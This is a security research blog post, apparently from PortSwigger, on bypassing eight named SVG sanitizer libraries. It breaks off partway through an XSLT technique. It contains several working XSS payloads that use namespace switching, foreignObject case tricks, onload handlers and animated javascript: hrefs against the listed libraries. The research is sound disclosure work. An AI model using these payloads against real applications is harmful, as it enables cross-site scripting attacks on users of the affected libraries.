---
title: Scalable Vector Grief
url: https://portswigger.net/research/scalable-vector-grief
source: PortSwigger Research
date: 2026-10-27
fetch_date: 2026-10-28T07:47:55.382149
---

# Scalable Vector Grief

[Login](/users)

[ ]

Products

Solutions

[Research](/research)
[Academy](/web-security)

Support

Company

[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)

[My account](/users/youraccount)
[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)

[![Burp AT](/mega-nav/images/burp-at.svg)
**Burp AT**
Agentic AI that extends human-led pentesting.](/burp/burp-at)
[![Burp Suite DAST](/content/images/svg/icons/enterprise.svg)
**Burp Suite DAST**
The enterprise-enabled dynamic web vulnerability scanner.](/burp/enterprise)
[![Burp Suite Professional](/content/images/svg/icons/professional.svg)
**Burp Suite Professional**
The world's #1 web penetration testing toolkit.](/burp/pro)
[![Burp Suite Community Edition](/content/images/svg/icons/community.svg)
**Burp Suite Community Edition**
The best manual tools to start web security testing.](/burp/communitydownload)
[View all product editions](/burp)

[**Burp Scanner**

Burp Suite's web vulnerability scanner

![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg)](/burp/vulnerability-scanner)

[**Attack surface visibility**
Improve security posture, prioritize manual testing, free up time.](/solutions/attack-surface-visibility)
[**CI-driven scanning**
More proactive security - find and fix vulnerabilities earlier.](/solutions/ci-driven-scanning)
[**Application security testing**
See how our software enables the world to secure the web.](/solutions)
[**DevSecOps**
Catch critical bugs; ship more secure software, more quickly.](/solutions/devsecops)
[**Penetration testing**
Accelerate penetration testing - find more bugs, more quickly.](/solutions/penetration-testing)
[**Automated scanning**
Scale dynamic scanning. Reduce risk. Save time/money.](/solutions/automated-security-testing)
[**Bug bounty hunting**
Level up your hacking and earn more bug bounties.](/solutions/bug-bounty-hunting)
[**Compliance**
Enhance security monitoring to comply with confidence.](/solutions/compliance)

[View all solutions](/solutions)

[**Product comparison**

What's the difference between Pro and DAST?

![Burp Suite Professional vs Burp Suite DAST](/mega-nav/images/burp-suite.jpg)](/burp/dast/resources/dast-vs-professional)

[**Support Center**
Get help and advice from our experts on all things Burp.](/support)
[**Documentation**
Tutorials and guides for Burp Suite.](/burp/documentation)
[**Get Started - Professional**
Get started with Burp Suite Professional.](/burp/documentation/desktop/getting-started)
[**Get Started - DAST**
Get started with Burp Suite DAST.](/burp/documentation/dast/setup)
[**Downloads**
Download the latest version of Burp Suite.](/burp/releases)

[Visit the Support Center](/support)

[**Downloads**

Download the latest version of Burp Suite.

![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg)](/burp/releases)

[ ]

Articles

* [Overview](/research)
* [ ]

  Core Topics

  [Black Hat](/research/black-hat)
  [XSS](/research/cross-site-scripting-research)
  [Request Smuggling](/research/request-smuggling)
  [Template Injection](/research/template-injection)
  [Top 10 Hacking Techniques](/research/top-10-web-hacking-techniques)
* [Articles](/research/articles)
* [ ]

  Meet the Researchers

  [James Kettle](/research/james-kettle)
  [Gareth Heyes](/research/gareth-heyes)
  [Zakhar Fedotkin](/research/zakhar-fedotkin)
  [Tom Stacey](/research/tom-stacey)
  [Alex Craig](/research/alex-craig)
* [Talks](/research/talks)
* [RSS](/research/rss)

# Scalable Vector Grief

[ ]

![Gareth Heyes](/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

* **Published:** Tuesday, 27 October 2026 at 14:29 UTC
* **Updated:** Tuesday, 27 October 2026 at 14:29 UTC

![An illustration showing an SVG document and curves breaking](/cms/images/11/0b/c71d-article-article.png)

**I tested eight popular SVG sanitizers and bypassed six of them. In this post, I'll show you how a response header can run JavaScript in Firefox even when the response body is completely harmless XML. I'll also show you how to get Safari to import a GIF as SVG and execute JavaScript from it.**

## Hacking SVG sanitizers

### The targets

SVG is an image format that can contain scripts, event handlers, links, animations and even embedded HTML, so applications that accept SVG uploads usually run them through a sanitizer first. To see how well those sanitizers hold up, I tested the most popular SVG libraries according to ChatGPT:

* <https://github.com/darylldoyle/svg-sanitizer>
* <https://github.com/cloudflare/svg-hush>
* <https://github.com/cure53/DOMPurify>
* <https://github.com/Borewit/svg-sanitizer>
* <https://github.com/bgalek/safe-svg>
* <https://github.com/mattkrick/sanitize-svg>
* <https://github.com/alnorris/SVG-Sanitizer>
* <https://github.com/jams2/py-svg-hush>

### Warming up: namespace confusion

**Library affected: mattkrick/sanitize-svg**

This library has so many bypasses that I'll only cover the interesting ones.

My first finding was that you don't need `<foreignObject>` to get HTML into an SVG. Switch the XML namespace on a single element to XHTML and the browser renders it as HTML directly inside the SVG. A `<frame>` with a JavaScript URL is all it takes:

`<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><frame xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(document.domain)"/></svg>`

The same namespace trick works with iframes, which gives you srcdoc to play with:

`<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50"><iframe xmlns="http://www.w3.org/1999/xhtml" width="200" height="50" srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"/></svg>`

The library could also be bypassed with a plain old `<foreignObject>`. It renders the SVG, which converts the element name to its camel-case form, foreignObject. It then hunts for the element with `querySelectorAll('foreignobject')`, which finds nothing, so the payload goes straight through:

`<svg xmlns="http://www.w3.org/2000/svg"><foreignobject><img src=x onerror=alert(1)></foreignobject></svg>`

Even a nested SVG with an onload handler got through:

`<svg xmlns="http://www.w3.org/2000/svg"><svg onload="alert(1)"/></svg>`

### Animating your way to a JavaScript URL

**Library affected: Borewit/svg-sanitizer**

This one didn't take much effort. The library let `<animate>` tags through untouched, so you could animate a link's href into a JavaScript URL:

`<svg xmlns="http://www.w3.org/2000/svg"><a><animate attributeName="href" values="JavaScript:alert(1)"/><text x="20" y="20">XSS</text></a></svg>`

I bypassed the same library a second way using
[Kevin Mizu's](https://x.com/kevin_mizu)
[trick](https://mizu.re/post/dompurify-bypass-smil-animatetransform-safari), which uses <animateTransform> to set a JavaScript URL in Safari:

`<svg xmlns="http://www.w3.org/2000/svg" width="800" height="120" viewBox="0 0 1000 120"><a id="target" href="#safe"><text x="20" y="55" font-size="26">Wait one second, then click</text><animateTransform attributeName="href" type="invalid" values="XXX;javascript:alert(1)//" begin="0s" dur="0.1s" fill="freeze"></animateTransform></a></svg>`

### XSS from a self-contained XSLT stylesheet

**Libraries affected: bgalek/safe-svg, mattkrick/sanitize-svg, alnorris/SVG-Sanitizer**

Now things get more interesting. This is a pretty epic technique: you can get JavaScript execution from an XSLT stylesheet without needing a separate file. I was desperate to blog this one, because unfortunately the feature is deprecated and due for removal November 2026.

The trick is to point an xml-stylesheet processing instruction at a data URL. Base64 is the most elegant way t...